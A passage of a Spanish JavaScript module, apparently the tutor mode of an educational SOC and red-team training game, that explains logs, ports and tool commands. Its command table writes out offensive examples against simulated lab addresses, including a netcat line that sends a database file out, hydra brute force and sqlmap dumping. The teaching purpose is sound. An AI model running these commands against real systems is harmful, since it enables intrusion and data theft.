// ============================================================
// tutor.js — Modo tutor: explica bajo demanda qué significa
// cada evidencia del caso actual y, sobre todo, POR QUÉ.
//
// Comando: explicar <evidencia>
//   - explicar                    → menú de qué se puede explicar
//   - explicar caso               → historia del ataque y qué se espera
//   - explicar <ruta>             → explica un archivo/evidencia del fs
//   - explicar mail <n>           → explica un correo
//   - explicar alerta <id>        → explica una alerta del SIEM
//   - explicar <dominio|ip|url>   → explica un indicador de compromiso
//   - explicar hash <hash>        → explica un hash
//
// En red team además explica hosts (puertos) y objetivos web.
// Reutiliza los datos descriptivos que ya lleva cada caso
// (whois, VT, reputación) y añade el "por qué importa".
// ============================================================

import { leer } from "./filesystem.js";

export const EXPLICAR_AYUDA =
  "explicar [evidencia] — modo tutor: explica qué significa y por qué importa cada evidencia del caso (explicar sin argumentos = menú)";

// ---------- Puertos típicos (red team) ----------
const PUERTOS = {
  21: "FTP — transferencia de archivos, a menudo con credenciales en claro",
  22: "SSH — acceso remoto cifrado; objetivo clásico de fuerza bruta (hydra)",
  23: "Telnet — acceso remoto SIN cifrar (credenciales viajan en claro)",
  25: "SMTP — envío de correo; relay abierto = spam y phishing",
  53: "DNS — resolución de nombres; canal frecuente de exfiltración (túneles)",
  80: "HTTP — web sin cifrar; enumeración de directorios (gobuster) y vulnerabilidades (nikto)",
  110: "POP3 — correo entrante sin cifrar",
  143: "IMAP — correo entrante sin cifrar",
  443: "HTTPS — web cifrada; superficie de ataque principal",
  445: "SMB — compartición de archivos en Windows; movimiento lateral y EternalBlue",
  3306: "MySQL — base de datos; objetivo de inyección SQL (sqlmap)",
  3389: "RDP — escritorio remoto de Windows; objetivo de fuerza bruta en masa",
  5432: "PostgreSQL — base de datos",
  5900: "VNC — escritorio remoto sin cifrar (a menudo sin contraseña)",
  8080: "HTTP alternativo — paneles de administración expuestos, proxies",
  8443: "HTTPS alternativo — paneles de administración",
  1337: "Puerto típico de backdoors/shells (netcat)",
  4444: "Puerto típico de metasploit meterpreter",
  9001: "Puerto de C2/backdoors",
};

// ---------- Conocimiento por tipo de archivo ----------
// re: patrón sobre la ruta. cada entrada: qué es, por qué importa, señales.
const TUTOR_ARCHIVOS = [
  {
    re: /alerts\.json$/,
    queEs:
      "Es el SIEM: la correlación de fuentes (DNS, EDR, proxy…) que dispara alertas. " +
      "Recuerda: una alerta es una SEÑAL, no la verdad — siempre hay que confirmarla con el log original.",
    porQue:
      "Te dice qué cree el SOC que está pasando, con severidad y fuente. Correlaciona: varias alertas " +
      "apuntando al mismo host/dominio = intrusión; una sola = ruido.",
    senales: ["severidad (HIGH/CRITICAL) y fuente (dns/edr/siem)", "título: qué patrón se detectó", "estado ABIERTA = sigue en curso"],
  },
  {
    re: /dns\.log$/,
    queEs:
      "Log de consultas DNS del servidor de resolución. Registra qué cliente pregunta por qué dominio.",
    porQue:
      "El DNS es el canal que casi nadie vigila: los atacantes lo usan para beaconing (llamar al C2) y " +
      "para exfiltrar datos en trozos codificados en subdominios (túnel DNS, T1048.003).",
    senales: [
      "un mismo dominio repetido con intervalos regulares = periodicidad (beaconing)",
      "subdominios largos/aleatorios = entropía alta (túnel de exfiltración)",
      "consultas TXT hacia un dominio desconocido = canal de datos oculto",
      "dominios jóvenes o que imitan a servicios legítimos (lookalike)",
    ],
  },
  {
    re: /proxy\.log$/,
    queEs:
      "Log del proxy corporativo: todo el tráfico HTTP/HTTPS saliente de la empresa.",
    porQue:
      "El tráfico saliente es la autopista hacia el C2. Un GET repetido al mismo dominio, a horas " +
      "regulares y devolviendo 200, es el latido de un beacon de malware.",
    senales: ["misma URL con periodicidad", "dominios de distribución de malware (CDN falsos)", "TCP_MISS + octet-stream = descarga de binario"],
  },
  {
    re: /edr\.json$/,
    queEs:
      "Telemetría del endpoint (EDR): qué procesos se ejecutan, con qué argumentos y qué hacen en red.",
    porQue:
      "Es la prueba forense más valiosa: el atacante puede esconder archivos, pero no puede evitar que " +
      "el EDR registre los procesos que lanza. Aquí se ve la cadena completa: proceso padre → hijo → red.",
    senales: [
      "process_start con powershell.exe -enc (comando ofuscado) = ejecución de código",
      "proceso normal (powershell) haciendo SMB a otro servidor = movimiento lateral",
      "network_out hacia IP externa desconocida = comunicación con C2",
      "schtasks.exe creando tarea = persistencia",
    ],
  },
  {
    re: /tasks\.log$/,
    queEs: "Log de creación y ejecución de tareas programadas de Windows (schtasks).",
    porQue:
      "Las tareas programadas son el mecanismo de persistencia favorito: se ejecutan solas cada X " +
      "minutos y sobreviven a reinicios. Nombres inocuos (OneDriveSync, AdobeUpdate…) ocultan el beacon.",
    senales: ["tarea creada fuera de la ventana de mantenimiento de TI", "ejecuta powershell -enc", "repetición cada pocos minutos"],
  },
  {
    re: /crontab$/,
    queEs: "Tabla de tareas programadas de Linux (cron): qué se ejecuta y cuándo.",
    porQue: "En Linux, cron es la persistencia equivalente a schtasks: un cron job extraño = backdoor que vuelve.",
    senales: ["líneas que descargan algo (wget/curl) o ejecutan scripts ocultos", "ruta en /tmp o /dev/shm"],
  },
  {
    re: /headers.*\.txt$/,
    queEs: "Cabeceras completas de un correo. Es la matrícula del mensaje: de dónde vino de verdad.",
    porQue:
      "El campo 'De:' es trivial de falsificar; las cabeceras no. SPF, DKIM y DMARC validan que el " +
      "remitente está autorizado a usar ese dominio — si fallan, el correo es sospechoso aunque parezca real.",
    senales: [
      "Return-Path/Received apuntando a un dominio distinto del visible",
      "dominio del remitente registrado hace días (recién creado)",
      "X-Mailer antiguo (Outlook Express 6) = señuelo para parecer legítimo",
      "SPF/DKIM/DMARC con resultado fallido o neutral",
    ],
  },
  {
    re: /\.(docm|docx|xlsm)$/,
    queEs: "Documento de Office. El .docm/xlsm puede llevar MACROS: código que se ejecuta al abrirlo.",
    porQue:
      "Las macros son el vector nº1 de phishing inicial: el usuario 'solo abre un documento' y el " +
      "macro descarga e instala malware. Analízalo SIN abrirlo.",
    senales: ["macros que llaman a PowerShell, WScript.Shell o descargan URLs", "decodifica lo que encuentres con strings/decode"],
  },
  {
    re: /\.exe$/,
    queEs: "Ejecutable Windows (PE). En un caso, suele ser el binario del atacante recuperado.",
    porQue:
      "Con strings se le sacan las tripas sin ejecutarlo: URLs de C2, comandos de persistencia, " +
      "cadenas de registry. Nunca lo ejecutes: calcúlale el hash y tíralo a VirusTotal.",
    senales: ["URLs incrustadas = C2 o descarga", "entradas de Run/RunOnce o schtasks = persistencia", "hash en VirusTotal = detección"],
  },
  {
    re: /README.*\.txt$/,
    queEs: "Guía del caso: qué fuentes hay y con qué comandos investigarlas.",
    porQue: "Es la hoja de ruta del analista: léelo primero para no perder tiempo.",
    senales: [],
  },
  {
    re: /hash\.txt$/,
    queEs: "Fichero de hashes de contraseñas robadas (formato john/hashcat).",
    porQue: "Un hash no es la contraseña, pero john/hashcat la recuperan con diccionarios — por eso las contraseñas débiles caen en segundos.",
    senales: ["formato: usuario:hash", "si el hash es MD5, crackear es trivial"],
  },
  {
    re: /searchsploit\.txt$/,
    queEs: "Base local de exploits (Exploit-DB): qué vulnerabilidades conocidas existen para una versión.",
    porQue: "La versión de un servicio + un exploit público = el puente entre 'veo nginx 1.24' y 'entro'.",
    senales: ["busca por la versión exacta que viste en nmap", "marca los que aplican al SO/servicio objetivo"],
  },
  {
    re: /\.(db|sql|crown|sqlite)$/,
    queEs: "Base de datos o volcado de datos. En un pentest, es el objetivo: la joya de la corona.",
    porQue: "Las bases de datos contienen lo que el atacante quiere: credenciales, datos de clientes, secretos. Exfiltra/recupera con cuidado.",
    senales: [],
  },
  {
    re: /(\.xlsx|\.csv|\.pdf|proyectos|fusion|nomina|plan)/,
    queEs: "Documento de negocio. En un caso de exfiltración, es lo que el atacante está robando.",
    porQue: "El valor no está en el archivo: está en quién lo lee y hacia dónde va. Un powershell.exe leyendo un xlsx de finanzas = movimiento lateral + exfiltración.",
    senales: ["quién lo lee (proceso + cuenta)", "hacia dónde sale (DNS/proxy)"],
  },
  {
    re: /wordlists?/,
    queEs: "Diccionario de contraseñas (top-N). Lo usa hydra/john para probar credenciales.",
    porQue: "La fuerza bruta solo funciona contra contraseñas débiles: si la contraseña está en el diccionario, la política de contraseñas falló.",
    senales: [],
  },
];

// ---------- Conocimiento de comandos (explicar comando <nombre>) ----------
const COMANDOS = {
  // ---- Caso ----
  ver_caso: { lado: "ambos", que: "Muestra el briefing, el objetivo y las pistas del caso actual.", porQue: "Antes de tocar nada debes saber qué pasó y qué se espera de ti: el informe evalúa la cobertura del objetivo, no los comandos sueltos.", ejemplo: "ver_caso" },
  pista: { lado: "ambos", que: "Pide una pista al supervisor; cuesta puntos.", porQue: "Las pistas cuestan porque en un SOC real no existen: un triaje lento se paga en horas de respuesta y en cobertura. Úsala solo atascado.", ejemplo: "pista" },
  estado: { lado: "ambos", que: "Muestra XP, rango, SLA restante, objetivos cumplidos y errores.", porQue: "El SLA es tiempo real, como en un SOC: la respuesta lenta deja escapar el incidente. El estado te dice dónde estás.", ejemplo: "estado" },

  // ---- Fuentes ----
  mail: { lado: "defensa (SOC)", que: "Lista el buzón o lee un correo completo del caso.", porQue: "El phishing es el vector de entrada nº1: cabeceras, dominio del remitente y urgencia son el primer triaje. Nunca abras el adjunto.", ejemplo: "mail 1" },
  alertas: { lado: "defensa (SOC)", que: "Lista las alertas del SIEM del caso (alias: siem).", porQue: "El SIEM correlaciona fuentes: una alerta es una SEÑAL, el log original es la verdad. Confirmar antes de actuar evita los falsos positivos.", ejemplo: "alertas" },

  // ---- Archivos ----
  ls: { lado: "ambos", que: "Lista archivos y directorios del filesystem del caso.", porQue: "Saber qué evidencias existen antes de leer: un incidente se resuelve explorando, no adivinando.", ejemplo: "ls /var/log" },
  cat: { lado: "ambos", que: "Muestra el contenido de un archivo.", porQue: "El log crudo es la fuente primaria: todo lo demás (alertas, resúmenes) es interpretación. Aquí está la evidencia.", ejemplo: "cat /var/log/dns.log" },
  head: { lado: "ambos", que: "Primeras líneas de un archivo (10 por defecto).", porQue: "El principio de un log concentra la configuración y los primeros eventos de la ventana.", ejemplo: "head -n 5 /var/log/proxy.log" },
  tail: { lado: "ambos", que: "Últimas líneas de un archivo (10 por defecto).", porQue: "El final de un log es lo más reciente: el estado actual del incidente. Los eventos vivos aparecen aquí.", ejemplo: "tail -n 5 /var/log/dns.log" },
  grep: { lado: "ambos", que: "Filtra líneas que contienen un patrón.", porQue: "Los logs de un incidente son gigabytes; grep convierte volumen en señales. Es la herramienta que más usará un analista.", ejemplo: "grep cdn-updates /var/log/dns.log" },
  wc: { lado: "ambos", que: "Cuenta líneas y caracteres de un archivo.", porQue: "El volumen es una señal: un log que crece sin motivo indica actividad inusual (beaconing, exfiltración).", ejemplo: "wc /var/log/dns.log" },
  less: { lado: "ambos", que: "Visualiza un archivo paginado (máx. 120 líneas).", porQue: "Para archivos largos sin perder el hilo; combina con head/tail/grep para no ahogarte.", ejemplo: "less /opt/siem/alerts.json" },
  find: { lado: "ambos", que: "Busca archivos por nombre.", porQue: "Localiza evidencias sin recorrer todo el árbol: en red team, encontrar la joya de la corona; en SOC, el binario recuperado.", ejemplo: "find update.exe" },
  strings: { lado: "ambos", que: "Extrae las cadenas legibles de un binario SIN ejecutarlo.", porQue: "De un malware sacas URLs de C2, comandos de persistencia y rutas del registry. Es leer las tripas sin correr el riesgo.", ejemplo: "strings update.exe" },
  file: { lado: "ambos", que: "Identifica el tipo real de un archivo.", porQue: "Saber si es un PE ejecutable, un documento OLE o texto cambia todo el análisis (y si abrirlo es peligroso).", ejemplo: "file update.exe" },

  // ---- Hash / malware ----
  md5sum: { lado: "ambos", que: "Calcula el hash MD5 de un archivo.", porQue: "El hash es la huella dactilar: con él consultas VirusTotal y sabes si el archivo es malware conocido. MD5 es débil frente a colisiones: usa SHA-256 cuando puedas.", ejemplo: "md5sum update.exe" },
  sha256sum: { lado: "ambos", que: "Calcula el hash SHA-256 de un archivo.", porQue: "El estándar forense: un solo hash identifica el binario de forma inequívoca ante todos los motores de VirusTotal.", ejemplo: "sha256sum update.exe" },
  decode: { lado: "ambos", que: "Decodifica base64 y PowerShell -enc (alias: base64).", porQue: "La ofuscación estándar de los atacantes: -enc oculta el payload real. Decodificar revela exactamente qué va a ejecutar el equipo comprometido.", ejemplo: "decode <bloque base64 del strings>" },
  vt: { lado: "ambos", que: "Consulta VirusTotal por hash.", porQue: "El veredicto de decenas de motores convierte «archivo raro» en «malware conocido con familia» — la prueba que cierra un caso.", ejemplo: "vt <sha256>" },

  // ---- Red ----
  whois: { lado: "ambos", que: "Consulta el registro de un dominio o IP.", porQue: "Un dominio joven con titular oculto y ASN de hosting tolerante es infraestructura de campaña. El whois desmonta el lookalike.", ejemplo: "whois cdn-updates-ms.com" },
  dig: { lado: "ambos", que: "Resuelve un dominio a IP (alias: host, nslookup).", porQue: "Ver a dónde apunta el dominio y contrastarlo con lo que dice ser: un «Microsoft» que resuelve a una IP báltica no es Microsoft.", ejemplo: "dig cdn-updates-ms.com" },
  curl: { lado: "ambos", que: "Hace una petición HTTP a una URL.", porQue: "Ver qué devuelve realmente la URL: un binario, un panel, o el latido de un C2. En SOC también sirve para confirmar IOCs.", ejemplo: "curl http://cdn-updates-ms.com/upd" },

  // ---- Respuesta (blue team) ----
  bloquear: { lado: "defensa (SOC)", que: "Bloquea un indicador (dominio/IP/URL) en firewall y DNS.", porQue: "Cortar el C2 detiene el beacon y la exfiltración: es la contención de red. Bloquear un indicador LEGÍTIMO rompe operaciones — comprueba antes de bloquear.", ejemplo: "bloquear dominio:cdn-updates-ms.com" },
  aislar: { lado: "defensa (SOC)", que: "Aísla un host de la red.", porQue: "Corta el movimiento lateral en el momento, SIN apagar: un equipo apagado pierde la memoria forense (y el ransomware puede reactivarse al arrancar).", ejemplo: "aislar host:HOST-210" },
  deshabilitar: { lado: "defensa (SOC)", que: "Deshabilita una cuenta de usuario comprometida.", porQue: "La cuenta es la puerta que usa el atacante: deshabilitarla corta el acceso incluso si el host está limpio.", ejemplo: "deshabilitar usuario:r.gutierrez" },
  escalar: { lado: "defensa (SOC)", que: "Escala el incidente a CSIRT / Nivel 2.", porQue: "Un APT o un ransomware no se resuelve en primera línea: escalar a tiempo es parte del trabajo, no un fracaso.", ejemplo: "escalar" },
  cerrar_caso: { lado: "defensa (SOC)", que: "Cierra el caso como falso positivo (solo si lo es).", porQue: "Investigar antes de cerrar: un cierre erróneo deja la intrusión viva y el incidente seguirá creciendo sin que nadie mire.", ejemplo: "cerrar_caso baseline confirmado" },
  informe: { lado: "defensa (SOC)", que: "Redacta y entrega el informe del incidente.", porQue: "El informe es el entregable real: cobertura de IOCs, no comandos sueltos. Un incidente sin informe no está cerrado.", ejemplo: "informe" },
  vssadmin: { lado: "defensa (SOC)", que: "Muestra las copias de sombra de volumen del host.", porQue: "El ransomware las borra antes de cifrar (T1490): saber si queda una copia decide la vía de recuperación.", ejemplo: "vssadmin list shadows" },
  pagar: { lado: "defensa (SOC)", que: "Decide si se paga el rescate.", porQue: "NO se paga: sin garantía de recuperación, financiando el siguiente ataque, y una parte importante de las víctimas que pagan nunca recibe el descifrador. La recuperación sale de los backups limpios.", ejemplo: "pagar" },

  // ---- Red team ----
  nmap: { lado: "ataque (red team)", que: "Escanea puertos, servicios y versiones de un host o rango.", porQue: "La enumeración es el 80% del pentest: las versiones de servicio son la lista de CVEs candidatos. Sin mapa, atacas a ciegas.", ejemplo: "nmap 10.10.10.0/24" },
  gobuster: { lado: "ataque (red team)", que: "Fuerza bruta de directorios en un servidor web.", porQue: "Un /admin o /backup expuesto es un hallazgo de severidad alta sin haber explotado nada: la web habla más de lo que debería.", ejemplo: "gobuster http://10.10.10.5" },
  nikto: { lado: "ataque (red team)", que: "Analiza vulnerabilidades del servidor web.", porQue: "Cruza versiones con CVEs conocidos y configuración peligrosa: confirma en 10 segundos lo que un manual tardaría horas.", ejemplo: "nikto http://10.10.10.5" },
  searchsploit: { lado: "ataque (red team)", que: "Busca exploits públicos en la base local (Exploit-DB).", porQue: "Versión vulnerable + exploit público = el puente entre «veo nginx 1.24» y «entro». Documenta la referencia del CVE.", ejemplo: "searchsploit nginx" },
  hydra: { lado: "ataque (red team)", que: "Fuerza bruta de credenciales contra un servicio.", porQue: "No explota un bug: explota políticas de contraseña débiles. La defensa es MFA, bloqueo de cuenta y no exponer SSH.", ejemplo: "hydra ssh 10.10.10.20 -u admin -w /opt/wordlists/top1000.txt" },
  ssh: { lado: "ataque (red team)", que: "Acceso remoto con credenciales conocidas.", porQue: "Una credencial válida es el acceso más silencioso: no dispara exploits. Por eso robar credenciales (mimikatz, phishing) vale tanto.", ejemplo: "ssh admin@10.10.10.20" },
  sqlmap: { lado: "ataque (red team)", que: "Detecta y explota inyecciones SQL y vuelca la base de datos.", porQue: "Explota aplicaciones que concatenan SQL con el input del usuario. El fix de verdad son consultas parametrizadas, no un WAF.", ejemplo: "sqlmap -u http://10.10.10.30/producto?id=1 --dump" },
  msf: { lado: "ataque (red team)", que: "Lanza exploits y gestiona sesiones con Metasploit (alias: msfconsole).", porQue: "El framework estandariza la explotación: seleccionas el exploit según la versión del servicio y obtienes una sesión en el objetivo.", ejemplo: "msf php-upload-rce http://10.10.10.50/upload" },
  mimikatz: { lado: "ataque (red team)", que: "Extrae credenciales de la memoria de Windows (LSASS).", porQue: "Contraseñas, hashes NTLM y tickets en memoria: con el hash haces pass-the-hash sin conocer la contraseña. La defensa es Credential Guard y LSA Protection.", ejemplo: "mimikatz 10.10.10.60" },
  john: { lado: "ataque (red team)", que: "Crackea hashes de contraseñas con diccionario (alias: hashcat).", porQue: "Un hash no es la contraseña, pero los hashes débiles (MD5) caen en segundos. La defensa: algoritmos costosos (bcrypt/argon2) y MFA.", ejemplo: "john /tmp/hash.txt" },
  nc: { lado: "ataque (red team)", que: "Exfiltra datos por TCP con netcat.", porQue: "La exfiltración simple y directa: por eso el tráfico saliente anómalo es una de las señales que más vigila el SOC.", ejemplo: "nc 10.10.10.100 4444 < /data/crown.db" },
  exfiltrar: { lado: "ataque (red team)", que: "Copia un archivo del objetivo a tu máquina de pentest.", porQue: "La exfiltración es el objetivo final del engagement: documenta qué te llevas, porque el informe lo exige.", ejemplo: "exfiltrar /data/crown.db" },
  escalar_priv: { lado: "ataque (red team)", que: "Escala privilegios a root/admin en el sistema comprometido.", porQue: "Pasar de usuario a administrador cambia el alcance: acceso total. La defensa es mínimos privilegios y parcheo de kernel.", ejemplo: "escalar_priv www-data" },

  // ---- Sistema ----
  ayuda: { lado: "ambos", que: "Lista los comandos disponibles o explica la sintaxis de uno.", porQue: "La sintaxis importa: un comando mal escrito en un incidente real es tiempo perdido. Aquí está el manual.", ejemplo: "ayuda nmap" },
  explicar: { lado: "ambos", que: "Este modo tutor: explica qué significa y por qué importa cada evidencia.", porQue: "Estudiar el porqué es lo que convierte el juego en aprendizaje: primero entiendes, luego respondes.", ejemplo: "explicar /var/log/dns.log" },
  history: { lado: "ambos", que: "Muestra tu historial de comandos.", porQue: "En un SOC el historial es trazabilidad: qué hiciste y cuándo. Aquí te ayuda a no repetir comandos.", ejemplo: "history" },
  whoami: { lado: "ambos", que: "Muestra tu identidad y rango en el SOC.", porQue: "Saber con qué rol operas: un analista junior no firma un informe de CISO.", ejemplo: "whoami" },
  clear: { lado: "ambos", que: "Limpia la pantalla del terminal.", porQue: "Poca cosa, pero en un incidente la claridad visual es tiempo ganado.", ejemplo: "clear" },
  tutorial: { lado: "ambos", que: "Abre el mini tutorial de contexto.", porQue: "Para quien llega sin haber tocado un SOC: entender el marco antes de jugar.", ejemplo: "tutorial" },
  carrera: { lado: "ambos", que: "Abre el panel de tu carrera profesional.", porQue: "Ver tu progresión (XP, rangos, logros) es la gamificación del aprendizaje: cada caso te acerca al siguiente nivel.", ejemplo: "carrera" },
  glosario: { lado: "ambos", que: "Abre el diccionario del analista.", porQue: "Cada caso introduce términos nuevos (APT, beaconing, dwell time): el glosario los fija.", ejemplo: "glosario" },
};

const ALIAS_COMANDOS = {
  help: "ayuda", h: "ayuda", siem: "alertas", cls: "clear", msfconsole: "msf",
  hashcat: "john", host: "dig", nslookup: "dig", tutor: "explicar", base64: "decode",
  id: "whoami", cerrar: "cerrar_caso", "cerrar_caso": "cerrar_caso",
};

function listaComandos() {
  const lineas = ["⌨ COMANDOS EXPLICABLES — pide uno con `explicar comando <nombre>`", ""];
  for (const [k, c] of Object.entries(COMANDOS)) {
    lineas.push(`   ${k.padEnd(14)} ${c.que.split(".")[0]}  [${c.lado}]`);
  }
  return lineas.join("\n");
}

function explicarComando(nombre) {
  const base = String(nombre || "").trim().toLowerCase().split(/\s+/)[0];
  const key = ALIAS_COMANDOS[base] || base;
  const c = COMANDOS[key];
  if (!c) {
    return `No tengo una explicación didáctica para «${base}». Prueba \`explicar comando\` para la lista, o \`ayuda ${base}\` para la sintaxis.`;
  }
  const lineas = [];
  lineas.push(`⌨ COMANDO: ${key}${c.lado ? `  [${c.lado}]` : ""}`);
  lineas.push(`Qué hace: ${c.que}`);
  lineas.push(`Por qué importa: ${c.porQue}`);
  if (c.ejemplo) lineas.push(`Ejemplo: ${c.ejemplo}`);
  return lineas.join("\n");
}

// ---------- Acción esperada derivada de `correctas` ----------
const ACCIONES = {
  bloquear: "bloquear este indicador en firewall/DNS",
  aislar: "aislar este host de la red",
  deshabilitar: "deshabilitar esta cuenta",
  escalar: "escalar el incidente a CSIRT",
  cerrar: "cerrar el caso como falso positivo",
  recon: "incluirlo en la fase de reconocimiento",
  acceso: "alcanzar acceso a este objetivo",
  escalada: "escalar privilegios en este objetivo",
  exfiltracion: "recuperar/exfiltrar los datos de este objetivo",
};

function accionSugerida(caso, valor) {
  const v = String(valor).toLowerCase();
  const c = caso.correctas || {};
  for (const [k, arr] of Object.entries(c)) {
    if (!Array.isArray(arr)) continue;
    for (const x of arr) {
      const p = String(x).toLowerCase();
      const val = p.includes(":") ? p.slice(p.indexOf(":") + 1) : p;
      if (val === v) return ACCIONES[k] || null;
    }
  }
  return null;
}

// ---------- Análisis de señales en el contenido ----------
function analizarContenido(caso, contenido) {
  const lineas = [];
  const seen = new Set();
  const add = (l) => {
    if (!seen.has(l)) {
      seen.add(l);
      lineas.push(l);
    }
  };

  // IOCs del caso presentes en el contenido
  for (const [dom, info] of Object.entries(caso.dominios || {})) {
    const n = contenido.toLowerCase().split(dom.toLowerCase()).length - 1;
    if (n === 0) continue;
    const det = (info.vt && info.vt.deteccion) || info.registrado || "";
    add(`  → ${dom} aparece ${n} veces — ${det}`);
    if (n >= 4) add(`     ⚠ repetición con periodicidad: patrón compatible con beaconing/C2`);
  }
  for (const [ip, info] of Object.entries(caso.ips || {})) {
    if (!contenido.includes(ip)) continue;
    add(`  → IP ${ip}: ${info.reputacion || info.pais || "presente en la evidencia"}`);
  }

  // Señales genéricas
  if (/MZ/.test(contenido.slice(0, 4))) add("  → cabecera MZ = ejecutable Windows (PE32)");
  if (/[A-Za-z0-9+/]{60,}={0,2}/.test(contenido))
    add("  → bloque largo codificado (base64): en procesos suele ser PowerShell -enc (ofuscación)");
  if (/smb_open|smb_read/i.test(contenido))
    add("  → accesos SMB a recursos compartidos: movimiento lateral (T1021)");
  if (/process_start/i.test(contenido)) add("  → telemetría de inicio de procesos (EDR): cadena padre → hijo");
  if (/schtasks|task scheduler/i.test(contenido)) add("  → creación de tarea programada: persistencia (T1053.005)");
  if (/IN TXT|TXT\b/i.test(contenido) && /dns|queries/i.test(contenido))
    add("  → consultas TXT en DNS: canal típico de túneles de exfiltración");
  if (/while\(1\)|Start-Sleep|Invoke-WebRequest/i.test(contenido))
    add("  → bucle de comando PowerShell: loop de beaconing (descarga + espera)");

  return lineas;
}

// ---------- Explicaciones ----------
function explicarCaso(caso) {
  const l = caso.leccion || {};
  const lineas = [];
  lineas.push(`📄 CASO: ${caso.titulo}`);
  if (caso.severidad) lineas.push(`Severidad: ${caso.severidad} · Nivel ${caso.nivel} · XP ${caso.xp}`);
  lineas.push("");
  lineas.push(l.resumen || caso.briefing || "");
  if (l.mitre && l.mitre.length) {
    lineas.push("");
    lineas.push(`🧭 Técnicas MITRE ATT&CK: ${l.mitre.join(", ")}`);
    lineas.push("   (Busca cada código en attack.mitre.org — es el idioma que hablan los equipos de respuesta.)");
  }
  lineas.push("");
  lineas.push("🎯 Qué se espera de ti (lo que evalúa el informe):");
  const c = caso.correctas || {};
  if (Array.isArray(c.bloquear) && c.bloquear.length) lineas.push(`   - bloquear: ${c.bloquear.join(", ")}`);
  if (Array.isArray(c.aislar) && c.aislar.length) lineas.push(`   - aislar: ${c.aislar.join(", ")}`);
  if (Array.isArray(c.deshabilitar) && c.deshabilitar.length) lineas.push(`   - deshabilitar: ${c.deshabilitar.join(", ")}`);
  if (Array.isArray(c.recon) && c.recon.length) lineas.push(`   - reconocimiento: ${c.recon.join(", ")}`);
  if (Array.isArray(c.acceso) && c.acceso.length) lineas.push(`   - acceso: ${c.acceso.join(", ")}`);
  if (Array.isArray(c.escalada) && c.escalada.length) lineas.push(`   - escalada: ${c.escalada.join(", ")}`);
  if (Array.isArray(c.exfiltracion) && c.exfiltracion.length) lineas.push(`   - exfiltración: ${c.exfiltracion.join(", ")}`);
  if (c.escalar) lineas.push("   - escalar el incidente");
  if (c.cerrar) lineas.push("   - cerrar el caso (falso positivo)");
  return lineas.join("\n");
}

function explicarMail(caso, n) {
  const correos = caso.correos || [];
  const m = correos[n - 1];
  if (!m) return `No existe el correo ${n}. Usa \`mail\` para listar.`;
  const lineas = [];
  lineas.push(`📧 CORREO ${n} — «${m.asunto}»`);
  lineas.push(`De: ${m.de}  →  Para: ${m.para}`);
  lineas.push("");
  lineas.push(`Estado: ${m.estado}`);
  if (m.adjunto) lineas.push(`Adjunto: ${m.adjunto}`);
  lineas.push("");
  // Análisis del remitente
  const domRemitente = (m.de || "").toLowerCase().split("@").pop();
  const dominios = caso.dominios || {};
  const enDominios = dominios[domRemitente];
  if (enDominios) {
    const det = (enDominios.vt && enDominios.vt.deteccion) || "en la base del caso";
    lineas.push(`🔍 Análisis del remitente: el dominio ${domRemitente} está en la base del caso — ${det}.`);
    if (enDominios.registrado) lineas.push(`   Registrado: ${enDominios.registrado}.`);
    if (enDominios.vt && enDominios.vt.comentarios) lineas.push(`   VT: ${enDominios.vt.comentarios}`);
  } else {
    lineas.push(`🔍 Análisis del remitente: ${domRemitente} no está marcado como malicioso en la base del caso.`);
  }
  // Señales en el cuerpo
  const cuerpo = (m.cuerpo || "").toLowerCase();
  const senales = [];
  if (/urgente|inmediat|suspend|bloquead|acción requerida/.test(cuerpo)) senales.push("lenguaje de URGENCIA: técnica clásica de ingeniería social");
  if (/descargue|instale|actualice|haga clic|enlace|link/.test(cuerpo)) senales.push("pide una ACCIÓN (descargar/instalar/pulsar): vector de entrega de malware");
  if (m.cuerpo && /https?:\/\//i.test(m.cuerpo)) {
    const urls = m.cuerpo.match(/https?:\/\/[^\s"']+/g) || [];
    for (const u of urls) {
      const desc = (caso.urls || {})[u];
      senales.push(`enlace ${u}${desc ? " — " + desc : ""}`);
    }
  }
  for (const [dom, info] of Object.entries(dominios)) {
    if (cuerpo.includes(dom.toLowerCase())) {
      senales.push(`menciona ${dom}${info.vt && info.vt.deteccion ? " (" + info.vt.deteccion + ")" : ""}`);
    }
  }
  if (senales.length) {
    lineas.push("");
    lineas.push("⚠ Señales en este correo:");
    for (const s of senales) lineas.push(`   - ${s}`);
  }
  if (m.headers) {
    lineas.push("");
    lineas.push(`📄 Cabeceras completas en ${m.headers} — explícalas con \`explicar ${m.headers}\`.`);
  }
  const acc = accionSugerida(caso, domRemitente) || accionSugerida(caso, (m.de || "").toLowerCase());
  if (acc) lineas.push("");
  return lineas.join("\n");
}

function explicarAlerta(caso, id) {
  const alertas = (caso.alertas || []).concat(caso.fs && caso.fs["/opt/siem/alerts.json"] ? JSON.parse(caso.fs["/opt/siem/alerts.json"]) : []);
  const a = alertas.find((x) => String(x.id).toLowerCase() === String(id).toLowerCase());
  if (!a) return `No existe la alerta ${id}. Usa \`alertas\` para listarlas.`;
  const FUENTES = {
    dns: "resolución de nombres — alertas aquí suelen significar beaconing o túnel de exfiltración",
    edr: "telemetría del endpoint — procesos sospechosos, ofuscación, conexiones del host",
    siem: "correlación central — agrupa varias fuentes: la más fiable",
    proxy: "tráfico HTTP saliente — comunicación con el C2",
  };
  const lineas = [];
  lineas.push(`🚨 ALERTA ${a.id} [${a.sev}] — ${a.titulo}`);
  lineas.push(`Fuente: ${String(a.fuente || "").toUpperCase()} — ${FUENTES[a.fuente] || "fuente desconocida"}`);
  if (a.ts) lineas.push(`Timestamp: ${a.ts}`);
  if (a.detalle) lineas.push("");
  if (a.detalle) lineas.push(`Detalle: ${a.detalle}`);
  lineas.push("");
  lineas.push("🧭 Cómo leerla: mira la FUENTE (qué la generó) y el TÍTULO (qué patrón).");
  lineas.push("   Luego confírmala en el log original — una alerta sin log de respaldo es ruido.");
  return lineas.join("\n");
}

function explicarDominio(caso, dom) {
  const d = (caso.dominios || {})[dom];
  if (!d) return null;
  const lineas = [];
  lineas.push(`🌐 DOMINIO: ${dom}`);
  if (d.registrado) lineas.push(`Registrado: ${d.registrado}`);
  if (d.registrador) lineas.push(`Registrador: ${d.registrador}`);
  if (d.ip) lineas.push(`IP: ${d.ip}`);
  if (d.whois || d.whoi) lineas.push("");
  if (d.whois || d.whoi) lineas.push(String(d.whois || d.whoi));
  if (d.vt) {
    lineas.push("");
    lineas.push(`🔬 VirusTotal: ${d.vt.deteccion || "n/d"}`);
    if (d.vt.familia) lineas.push(`   Familia: ${d.vt.familia}`);
    if (d.vt.comentarios) lineas.push(`   ${d.vt.comentarios}`);
  }
  const acc = accionSugerida(caso, dom);
  if (acc) {
    lineas.push("");
